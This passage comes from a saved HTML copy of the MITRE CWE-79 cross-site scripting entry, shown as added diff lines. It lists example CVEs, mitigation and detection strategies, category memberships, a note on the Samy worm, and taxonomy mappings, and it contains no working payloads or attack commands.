+               </div></div></div></div><p>For each person who visits the
+ message page, their browser would execute the script, generating a 
+pop-up window that says "Hacked". More malicious attacks are possible; 
+see the rest of this entry.</p></div></div></div></div><div id="Observed_Examples"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Observed_Examples');"><img id="ocimg_79_Observed_Examples" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Observed Examples</div><div name="oc_79_Observed_Examples" id="oc_79_Observed_Examples" class="expandblock"><div class="tabledetail"><div class="indent"><div style="margin-top: 10px"><table class="Detail" width="98%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><th width="165px" valign="top" nowrap="nowrap">Reference</th><th valign="top">Description</th></tr>
+            <tr><td valign="top"><div><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8958" target="_blank" rel="noopener noreferrer">CVE-2014-8958</a></div></td><td valign="top"><div class="indent">Admin GUI allows XSS through cookie. </div></td></tr>
+            <tr><td valign="top"><div><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9764" target="_blank" rel="noopener noreferrer">CVE-2017-9764</a></div></td><td valign="top"><div class="indent">Web stats program allows XSS through crafted HTTP header. </div></td></tr>
+            <tr><td valign="top"><div><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5198" target="_blank" rel="noopener noreferrer">CVE-2014-5198</a></div></td><td valign="top"><div class="indent">Web log analysis product allows XSS through crafted HTTP Referer header. </div></td></tr>
+            <tr><td valign="top"><div><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5080" target="_blank" rel="noopener noreferrer">CVE-2008-5080</a></div></td><td valign="top"><div class="indent">Chain: protection mechanism failure allows XSS </div></td></tr>
+            <tr><td valign="top"><div><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4308" target="_blank" rel="noopener noreferrer">CVE-2006-4308</a></div></td><td valign="top"><div class="indent">Chain: incomplete blacklist (<a href="http://cwe.mitre.org/data/definitions/184.html">CWE-184</a>) only checks "javascript:" tag, allowing XSS (<a href="http://cwe.mitre.org/data/definitions/79.html">CWE-79</a>) using other tags </div></td></tr>
+            <tr><td valign="top"><div><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5727" target="_blank" rel="noopener noreferrer">CVE-2007-5727</a></div></td><td valign="top"><div class="indent">Chain: incomplete blacklist (<a href="http://cwe.mitre.org/data/definitions/184.html">CWE-184</a>) only removes SCRIPT tags, enabling XSS (<a href="http://cwe.mitre.org/data/definitions/79.html">CWE-79</a>) </div></td></tr>
+            <tr><td valign="top"><div><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5770" target="_blank" rel="noopener noreferrer">CVE-2008-5770</a></div></td><td valign="top"><div class="indent">Reflected XSS using the PATH_INFO in a URL </div></td></tr>
+            <tr><td valign="top"><div><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4730" target="_blank" rel="noopener noreferrer">CVE-2008-4730</a></div></td><td valign="top"><div class="indent">Reflected XSS not properly handled when generating an error message </div></td></tr>
+            <tr><td valign="top"><div><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5734" target="_blank" rel="noopener noreferrer">CVE-2008-5734</a></div></td><td valign="top"><div class="indent">Reflected XSS sent through email message. </div></td></tr>
+            <tr><td valign="top"><div><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0971" target="_blank" rel="noopener noreferrer">CVE-2008-0971</a></div></td><td valign="top"><div class="indent">Stored XSS in a security product. </div></td></tr>
+            <tr><td valign="top"><div><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5249" target="_blank" rel="noopener noreferrer">CVE-2008-5249</a></div></td><td valign="top"><div class="indent">Stored XSS using a wiki page. </div></td></tr>
+            <tr><td valign="top"><div><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3568" target="_blank" rel="noopener noreferrer">CVE-2006-3568</a></div></td><td valign="top"><div class="indent">Stored XSS in a guestbook application. </div></td></tr>
+            <tr><td valign="top"><div><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3211" target="_blank" rel="noopener noreferrer">CVE-2006-3211</a></div></td><td valign="top"><div class="indent">Stored XSS in a guestbook application using a javascript: URI in a bbcode img tag. </div></td></tr>
+            <tr><td valign="top"><div><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3295" target="_blank" rel="noopener noreferrer">CVE-2006-3295</a></div></td><td valign="top"><div class="indent">Chain: library file is not protected against a direct request (<a href="http://cwe.mitre.org/data/definitions/425.html">CWE-425</a>), leading to reflected XSS (<a href="http://cwe.mitre.org/data/definitions/79.html">CWE-79</a>). </div></td></tr>
+         </tbody></table></div></div></div></div></div><div id="Potential_Mitigations"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Potential_Mitigations');"><img id="ocimg_79_Potential_Mitigations" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Potential Mitigations</div><div name="oc_79_Potential_Mitigations" id="oc_79_Potential_Mitigations" class="expandblock"><div class="detail"><div class="indent"><div id="Grouped"><table class="Detail" width="98%" cellspacing="0" cellpadding="0" border="0">
+            <tbody><tr><td valign="top"><p class="subheading">Phase:  Architecture and Design</p><div class="indent"><p class="suboptheading">Strategy:  Libraries or Frameworks</p></div><div class="indent"> </div><p></p><div class="indent">Use
+ a vetted library or framework that does not allow this weakness to 
+occur or provides constructs that make this weakness easier to avoid. </div><p></p><div class="indent"> </div><p></p><div class="indent">Examples
+ of libraries and frameworks that make it easier to generate properly 
+encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI 
+Encoding module, and Apache Wicket. </div><p></p><div class="indent"> </div></td></tr>
+            <tr><td valign="top"><p class="subheading">Phases:  Implementation; Architecture and Design</p><div class="indent"> </div><p></p><div class="indent">Understand
+ the context in which your data will be used and the encoding that will 
+be expected. This is especially important when transmitting data between
+ different components, or when generating outputs that can contain 
+multiple encodings at the same time, such as web pages or multi-part 
+mail messages. Study all expected communication protocols and data 
+representations to determine the required encoding strategies. </div><p></p><div class="indent"> </div><p></p><div class="indent">For
+ any data that will be output to another web page, especially any data 
+that was received from external inputs, use the appropriate encoding on 
+all non-alphanumeric characters. </div><p></p><div class="indent"> </div><p></p><div class="indent">Parts of the same output document may require different encodings, which will vary depending on whether the output is in the: </div><p></p><div class="indent"> </div><div style="margin-left:10px;"><div class="indent"> </div><ul><div class="indent"> </div><li><div class="indent">HTML body </div></li><div class="indent"> </div><li><div class="indent">Element attributes (such as src="XYZ") </div></li><div class="indent"> </div><li><div class="indent">URIs </div></li><div class="indent"> </div><li><div class="indent">JavaScript sections </div></li><div class="indent"> </div><li><div class="indent">Cascading Style Sheets and style property </div></li><div class="indent"> </div></ul><div class="indent"> </div></div><div class="indent"> </div><p></p><div class="indent">etc. Note that HTML Entity Encoding is only appropriate for the HTML body. </div><p></p><div class="indent"> </div><p></p><div class="indent">Consult the XSS Prevention Cheat Sheet [<a href="#REF-724">REF-724</a>] for more details on the types of encoding and escaping that are needed. </div><p></p><div class="indent"> </div></td></tr>
+            <tr><td valign="top"><p class="subheading">Phases:  Architecture and Design; Implementation</p><div class="indent"><p class="suboptheading">Strategy:  Attack Surface Reduction</p></div><div class="indent">Understand
+ all the potential areas where untrusted inputs can enter your software:
+ parameters or arguments, cookies, anything read from the network, 
+environment variables, reverse DNS lookups, query results, request 
+headers, URL components, e-mail, files, filenames, databases, and any 
+external systems that provide data to the application. Remember that 
+such inputs may be obtained indirectly through API calls. </div><div class="indent"><p class="suboptheading">Effectiveness: Limited</p></div><div class="indent"><b><span class="smaller">Note: </span></b>This
+ technique has limited effectiveness, but can be helpful when it is 
+possible to store client state and sensitive information on the server 
+side instead of in cookies, headers, hidden form fields, etc.</div></td></tr>
+            <tr><td valign="top"><p class="subheading">Phase:  Architecture and Design</p><div class="indent">For
+ any security checks that are performed on the client side, ensure that 
+these checks are duplicated on the server side, in order to avoid <a href="http://cwe.mitre.org/data/definitions/602.html">CWE-602</a>.
+ Attackers can bypass the client-side checks by modifying values after 
+the checks have been performed, or by changing the client to remove the 
+client-side checks entirely. Then, these modified values would be 
+submitted to the server. </div></td></tr>
+            <tr><td valign="top"><p class="subheading">Phase:  Architecture and Design</p><div class="indent"><p class="suboptheading">Strategy:  Parameterization</p></div><div class="indent">If
+ available, use structured mechanisms that automatically enforce the 
+separation between data and code. These mechanisms may be able to 
+provide the relevant quoting, encoding, and validation automatically, 
+instead of relying on the developer to provide this capability at every 
+point where output is generated. </div></td></tr>
+            <tr><td valign="top"><p class="subheading">Phase:  Implementation</p><div class="indent"><p class="suboptheading">Strategy:  Output Encoding</p></div><div class="indent"> </div><p></p><div class="indent">Use
+ and specify an output encoding that can be handled by the downstream 
+component that is reading the output. Common encodings include 
+ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a 
+downstream component may choose a different encoding, either by assuming
+ a default encoding or automatically inferring which encoding is being 
+used, which can be erroneous. When the encodings are inconsistent, the 
+downstream component might treat some character or byte sequences as 
+special, even if they are not special in the original encoding. 
+Attackers might then be able to exploit this discrepancy and conduct 
+injection attacks; they even might be able to bypass protection 
+mechanisms that assume the original encoding is also being used by the 
+downstream component. </div><p></p><div class="indent"> </div><p></p><div class="indent">The
+ problem of inconsistent output encodings often arises in web pages. If 
+an encoding is not specified in an HTTP header, web browsers often guess
+ about which encoding is being used. This can open up the browser to 
+subtle XSS attacks. </div><p></p><div class="indent"> </div></td></tr>
+            <tr><td valign="top"><p class="subheading">Phase:  Implementation</p><div class="indent">With Struts, write all data from form beans with the bean's filter attribute set to true. </div></td></tr>
+            <tr><td valign="top"><p class="subheading">Phase:  Implementation</p><div class="indent"><p class="suboptheading">Strategy:  Attack Surface Reduction</p></div><div class="indent">To
+ help mitigate XSS attacks against the user's session cookie, set the 
+session cookie to be HttpOnly. In browsers that support the HttpOnly 
+feature (such as more recent versions of Internet Explorer and Firefox),
+ this attribute can prevent the user's session cookie from being 
+accessible to malicious client-side scripts that use document.cookie. 
+This is not a complete solution, since HttpOnly is not supported by all 
+browsers. More importantly, XMLHTTPRequest and other powerful browser 
+technologies provide read access to HTTP headers, including the 
+Set-Cookie header in which the HttpOnly flag is set. </div><div class="indent"><p class="suboptheading">Effectiveness: Defense in Depth</p></div></td></tr>
+            <tr><td valign="top"><p class="subheading">Phase:  Implementation</p><div class="indent"><p class="suboptheading">Strategy:  Input Validation</p></div><div class="indent"> </div><p></p><div class="indent">Assume
+ all input is malicious. Use an "accept known good" input validation 
+strategy, i.e., use a whitelist of acceptable inputs that strictly 
+conform to specifications. Reject any input that does not strictly 
+conform to specifications, or transform it into something that does. </div><p></p><div class="indent"> </div><p></p><div class="indent">When
+ performing input validation, consider all potentially relevant 
+properties, including length, type of input, the full range of 
+acceptable values, missing or extra inputs, syntax, consistency across 
+related fields, and conformance to business rules. As an example of 
+business rule logic, "boat" may be syntactically valid because it only 
+contains alphanumeric characters, but it is not valid if the input is 
+only expected to contain colors such as "red" or "blue." </div><p></p><div class="indent"> </div><p></p><div class="indent">Do
+ not rely exclusively on looking for malicious or malformed inputs 
+(i.e., do not rely on a blacklist). A blacklist is likely to miss at 
+least one undesirable input, especially if the code's environment 
+changes. This can give attackers enough room to bypass the intended 
+validation. However, blacklists can be useful for detecting potential 
+attacks or determining which inputs are so malformed that they should be
+ rejected outright. </div><p></p><div class="indent"> </div><p></p><div class="indent">When
+ dynamically constructing web pages, use stringent whitelists that limit
+ the character set based on the expected value of the parameter in the 
+request. All input should be validated and cleansed, not just parameters
+ that the user is supposed to specify, but all data in the request, 
+including hidden fields, cookies, headers, the URL itself, and so forth.
+ A common mistake that leads to continuing XSS vulnerabilities is to 
+validate only fields that are expected to be redisplayed by the site. It
+ is common to see data from the request that is reflected by the 
+application server or the application that the development team did not 
+anticipate. Also, a field that is not currently reflected may be used by
+ a future developer. Therefore, validating ALL parts of the HTTP request
+ is recommended. </div><p></p><div class="indent"> </div><p></p><div class="indent">Note
+ that proper output encoding, escaping, and quoting is the most 
+effective solution for preventing XSS, although input validation may 
+provide some defense-in-depth. This is because it effectively limits 
+what will appear in output. Input validation will not always prevent 
+XSS, especially if you are required to support free-form text fields 
+that could contain arbitrary characters. For example, in a chat 
+application, the heart emoticon ("&lt;3") would likely pass the 
+validation step, since it is commonly used. However, it cannot be 
+directly inserted into the web page because it contains the "&lt;" 
+character, which would need to be escaped or otherwise handled. In this 
+case, stripping the "&lt;" might reduce the risk of XSS, but it would 
+produce incorrect behavior because the emoticon would not be recorded. 
+This might seem to be a minor inconvenience, but it would be more 
+important in a mathematical forum that wants to represent inequalities. </div><p></p><div class="indent"> </div><p></p><div class="indent">Even
+ if you make a mistake in your validation (such as forgetting one out of
+ 100 input fields), appropriate encoding is still likely to protect you 
+from injection-based attacks. As long as it is not done in isolation, 
+input validation is still a useful technique, since it may significantly
+ reduce your attack surface, allow you to detect some attacks, and 
+provide other security benefits that proper encoding does not address. </div><p></p><div class="indent"> </div><p></p><div class="indent">Ensure
+ that you perform input validation at well-defined interfaces within the
+ application. This will help protect the application even if a component
+ is reused or moved elsewhere. </div><p></p><div class="indent"> </div></td></tr>
+            <tr><td valign="top"><p class="subheading">Phase:  Architecture and Design</p><div class="indent"><p class="suboptheading">Strategy:  Enforcement by Conversion</p></div><div class="indent">When
+ the set of acceptable objects, such as filenames or URLs, is limited or
+ known, create a mapping from a set of fixed input values (such as 
+numeric IDs) to the actual filenames or URLs, and reject all other 
+inputs. </div></td></tr>
+            <tr><td valign="top"><p class="subheading">Phase:  Operation</p><div class="indent"><p class="suboptheading">Strategy:  Firewall</p></div><div class="indent">Use
+ an application firewall that can detect attacks against this weakness. 
+It can be beneficial in cases in which the code cannot be fixed (because
+ it is controlled by a third party), as an emergency prevention measure 
+while more comprehensive software assurance measures are applied, or to 
+provide defense in depth. </div><div class="indent"><p class="suboptheading">Effectiveness: Moderate</p></div><div class="indent"><b><span class="smaller">Note: </span></b>An
+ application firewall might not cover all possible input vectors. In 
+addition, attack techniques might be available to bypass the protection 
+mechanism, such as using malformed inputs that can still be processed by
+ the component that receives those inputs. Depending on functionality, 
+an application firewall might inadvertently reject or modify legitimate 
+requests. Finally, some manual effort may be required for customization.</div></td></tr>
+            <tr><td valign="top"><p class="subheading">Phases:  Operation; Implementation</p><div class="indent"><p class="suboptheading">Strategy:  Environment Hardening</p></div><div class="indent">When
+ using PHP, configure the application so that it does not use 
+register_globals. During implementation, develop the application so that
+ it does not rely on this feature, but be wary of implementing a 
+register_globals emulation that is subject to weaknesses such as <a href="http://cwe.mitre.org/data/definitions/95.html">CWE-95</a>, <a href="http://cwe.mitre.org/data/definitions/621.html">CWE-621</a>, and similar issues. </div></td></tr>
+         </tbody></table></div></div></div></div></div><div id="Weakness_Ordinalities"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Weakness_Ordinalities');"><img id="ocimg_79_Weakness_Ordinalities" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Weakness Ordinalities</div><div name="oc_79_Weakness_Ordinalities" id="oc_79_Weakness_Ordinalities" class="expandblock"><div class="tabledetail"><div class="indent"><div style="margin-top: 10px"><table class="Detail" width="98%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><th valign="top" nowrap="nowrap">Ordinality</th><th width="100%" valign="top">Description</th></tr>
+            <tr><td valign="top"><div style="font-size:90%;">Resultant</div></td><td valign="top"><div style="font-size:90%; font-style:italic; padding:5px;">(where the weakness is typically related to the presence of some other weaknesses)</div></td></tr>
+         </tbody></table></div></div></div></div></div><div id="Detection_Methods"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Detection_Methods');"><img id="ocimg_79_Detection_Methods" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Detection Methods</div><div name="oc_79_Detection_Methods" id="oc_79_Detection_Methods" class="expandblock"><div class="detail"><div class="indent"><div id="Grouped"><table class="Detail" width="98%" cellspacing="0" cellpadding="0" border="0">
+            <tbody><tr><td valign="top"><p class="subheading"> Automated Static Analysis</p><div class="indent">Use
+ automated static analysis tools that target this type of weakness. Many
+ modern techniques use data flow analysis to minimize the number of 
+false positives. This is not a perfect solution, since 100% accuracy and
+ coverage are not feasible, especially when multiple components are 
+involved. </div><div class="indent"><p class="suboptheading">Effectiveness: Moderate</p></div></td></tr>
+            <tr><td valign="top"><p class="subheading"> Black Box</p><div class="indent">Use the XSS Cheat Sheet [<a href="#REF-714">REF-714</a>]
+ or automated test-generation tools to help launch a wide variety of 
+attacks against your web application. The Cheat Sheet contains many 
+subtle XSS variations that are specifically targeted against weak XSS 
+defenses. </div><div class="indent"><p class="suboptheading">Effectiveness: Moderate</p></div><div class="indent"><b><span class="smaller">Note: </span></b>With
+ Stored XSS, the indirection caused by the data store can make it more 
+difficult to find the problem. The tester must first inject the XSS 
+string into the data store, then find the appropriate application 
+functionality in which the XSS string is sent to other users of the 
+application. These are two distinct steps in which the activation of the
+ XSS can take place minutes, hours, or days after the XSS was originally
+ injected into the data store.</div></td></tr>
+         </tbody></table></div></div></div></div></div><div id="Memberships"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Memberships');"><img id="ocimg_79_Memberships" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Memberships</div><div name="oc_79_Memberships" id="oc_79_Memberships" class="expandblock"><div class="detail"><div class="indent">This
+ MemberOf Relationships table shows additional CWE Categories and Views 
+that reference this weakness as a member. This information is often 
+useful in understanding where a weakness fits within the context of 
+external information sources.<div xmlns:saxon="http://saxon.sf.net/" xmlns:xalan="http://xml.apache.org/xalan" class="tabledetail" style="padding-top:10px"><table id="Detail" width="98%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><th width="110px" valign="top">Nature</th><th width="40px" valign="top">Type</th><th width="50px" valign="top">ID</th><th valign="top">Name</th></tr></tbody><tbody><tr class="primary View"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/view.gif" alt="View" class="icon"><span class="tip">View
+ - a subset of CWE entries that provides a way of examining CWE content.
+ The two main view structures are Slices (flat lists) and Graphs 
+(containing relationships between entries).</span></span></td><td valign="top">635</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/635.html" target="_blank" rel="noopener noreferrer">Weaknesses Originally Used by NVD from 2008 to 2016</a></td></tr><tr class="primary Category"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/category.gif" alt="Category" class="icon"><span class="tip">Category - a CWE entry that contains a set of other entries that share a common characteristic.</span></span></td><td valign="top">712</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/712.html" target="_blank" rel="noopener noreferrer">OWASP Top Ten 2007 Category A1 - Cross Site Scripting (XSS)</a></td></tr><tr class="primary Category"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/category.gif" alt="Category" class="icon"><span class="tip">Category - a CWE entry that contains a set of other entries that share a common characteristic.</span></span></td><td valign="top">722</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/722.html" target="_blank" rel="noopener noreferrer">OWASP Top Ten 2004 Category A1 - Unvalidated Input</a></td></tr><tr class="primary Category"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/category.gif" alt="Category" class="icon"><span class="tip">Category - a CWE entry that contains a set of other entries that share a common characteristic.</span></span></td><td valign="top">725</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/725.html" target="_blank" rel="noopener noreferrer">OWASP Top Ten 2004 Category A4 - Cross-Site Scripting (XSS) Flaws</a></td></tr><tr class="primary Category"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/category.gif" alt="Category" class="icon"><span class="tip">Category - a CWE entry that contains a set of other entries that share a common characteristic.</span></span></td><td valign="top">751</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/751.html" target="_blank" rel="noopener noreferrer">2009 Top 25 - Insecure Interaction Between Components</a></td></tr><tr class="primary Category"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/category.gif" alt="Category" class="icon"><span class="tip">Category - a CWE entry that contains a set of other entries that share a common characteristic.</span></span></td><td valign="top">801</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/801.html" target="_blank" rel="noopener noreferrer">2010 Top 25 - Insecure Interaction Between Components</a></td></tr><tr class="primary Category"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/category.gif" alt="Category" class="icon"><span class="tip">Category - a CWE entry that contains a set of other entries that share a common characteristic.</span></span></td><td valign="top">811</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/811.html" target="_blank" rel="noopener noreferrer">OWASP Top Ten 2010 Category A2 - Cross-Site Scripting (XSS)</a></td></tr><tr class="primary Category"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/category.gif" alt="Category" class="icon"><span class="tip">Category - a CWE entry that contains a set of other entries that share a common characteristic.</span></span></td><td valign="top">864</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/864.html" target="_blank" rel="noopener noreferrer">2011 Top 25 - Insecure Interaction Between Components</a></td></tr><tr class="primary View"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/view.gif" alt="View" class="icon"><span class="tip">View
+ - a subset of CWE entries that provides a way of examining CWE content.
+ The two main view structures are Slices (flat lists) and Graphs 
+(containing relationships between entries).</span></span></td><td valign="top">884</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/884.html" target="_blank" rel="noopener noreferrer">CWE Cross-section</a></td></tr><tr class="primary Category"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/category.gif" alt="Category" class="icon"><span class="tip">Category - a CWE entry that contains a set of other entries that share a common characteristic.</span></span></td><td valign="top">931</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/931.html" target="_blank" rel="noopener noreferrer">OWASP Top Ten 2013 Category A3 - Cross-Site Scripting (XSS)</a></td></tr><tr class="primary Category"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/category.gif" alt="Category" class="icon"><span class="tip">Category - a CWE entry that contains a set of other entries that share a common characteristic.</span></span></td><td valign="top">990</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/990.html" target="_blank" rel="noopener noreferrer">SFP Secondary Cluster: Tainted Input to Command</a></td></tr><tr class="primary Category"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/category.gif" alt="Category" class="icon"><span class="tip">Category - a CWE entry that contains a set of other entries that share a common characteristic.</span></span></td><td valign="top">1005</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/1005.html" target="_blank" rel="noopener noreferrer">7PK - Input Validation and Representation</a></td></tr><tr class="primary Category"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/category.gif" alt="Category" class="icon"><span class="tip">Category - a CWE entry that contains a set of other entries that share a common characteristic.</span></span></td><td valign="top">1033</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/1033.html" target="_blank" rel="noopener noreferrer">OWASP Top Ten 2017 Category A7 - Cross-Site Scripting (XSS)</a></td></tr><tr class="primary Category"><td valign="top">MemberOf</td><td class="right" style="padding-top:1px" valign="top" nowrap="nowrap" align="center"><span class="tool"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/category.gif" alt="Category" class="icon"><span class="tip">Category - a CWE entry that contains a set of other entries that share a common characteristic.</span></span></td><td valign="top">1131</td><td valign="top"><a href="http://cwe.mitre.org/data/definitions/1131.html" target="_blank" rel="noopener noreferrer">CISQ Quality Measures - Security</a></td></tr></tbody></table></div></div></div></div></div><div id="Notes"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Notes');"><img id="ocimg_79_Notes" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Notes</div><div name="oc_79_Notes" id="oc_79_Notes" class="expandblock"><div class="detail"><div class="indent"><p class="subheading">Applicable Platform</p><div class="indent">
+               <p>XSS flaws are very common in web applications, since they require a great deal of developer discipline to avoid them.</p>
+            </div><p class="subheading">Relationship</p><div class="indent">
+               <p>There can be a close relationship between XSS and CSRF (<a href="http://cwe.mitre.org/data/definitions/352.html">CWE-352</a>).
+ An attacker might use CSRF in order to trick the victim into submitting
+ requests to the server in which the requests contain an XSS payload. A 
+well-known example of this was the Samy worm on MySpace [<a href="#REF-956">REF-956</a>].
+ The worm used XSS to insert malicious HTML sequences into a user's 
+profile and add the attacker as a MySpace friend. MySpace friends of 
+that victim would then execute the payload to modify their own profiles,
+ causing the worm to propagate exponentially. Since the victims did not 
+intentionally insert the malicious script themselves, CSRF was a root 
+cause. </p>
+            </div></div></div></div></div><div id="Taxonomy_Mappings"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Taxonomy_Mappings');"><img id="ocimg_79_Taxonomy_Mappings" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Taxonomy Mappings</div><div name="oc_79_Taxonomy_Mappings" id="oc_79_Taxonomy_Mappings" class="expandblock"><div class="tabledetail"><div class="indent"><div style="margin-top: 10px"><table class="Detail" width="98%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><th width="230px" valign="top" nowrap="nowrap">Mapped Taxonomy Name</th><th width="100px" valign="top" nowrap="nowrap">Node ID</th><th valign="top" nowrap="nowrap">Fit</th><th valign="top">Mapped Node Name</th></tr>
+            <tr><td valign="top">PLOVER</td><td valign="top"></td><td valign="top"></td><td valign="top">Cross-site scripting (XSS)</td></tr>
+            <tr><td valign="top">7 Pernicious Kingdoms</td><td valign="top"></td><td valign="top"></td><td valign="top">Cross-site Scripting</td></tr>
+            <tr><td valign="top">CLASP</td><td valign="top"></td><td valign="top"></td><td valign="top">Cross-site scripting</td></tr>
+            <tr><td valign="top">OWASP Top Ten 2007</td><td valign="top">A1</td><td valign="top">Exact</td><td valign="top">Cross Site Scripting (XSS)</td></tr>
+            <tr><td valign="top">OWASP Top Ten 2004</td><td valign="top">A1</td><td valign="top">CWE More Specific</td><td valign="top">Unvalidated Input</td></tr>
